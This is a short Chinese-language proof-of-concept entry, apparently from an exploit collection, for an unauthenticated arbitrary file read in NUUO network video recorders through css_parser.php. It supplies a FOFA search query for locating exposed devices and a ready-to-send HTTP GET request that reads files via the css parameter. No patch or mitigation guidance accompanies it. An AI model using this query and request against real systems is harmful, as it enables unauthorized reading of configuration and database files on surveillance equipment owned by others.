# NUUO网络视频录像机css_parser.php任意文件读取漏洞

NUUO网络视频录像机 css_parser.php 存在任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。

## fofa

```javascript
body="www.nuuo.com/eHelpdesk.php"
```

## poc

```javascript
GET /css_parser.php?css=css_parser.php HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept: application/json, text/javascript, */*; q=0.01
Accept-Encoding: gzip, deflate
Connection: keep-alive
```

![image-20240911095835420](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202409110958603.png)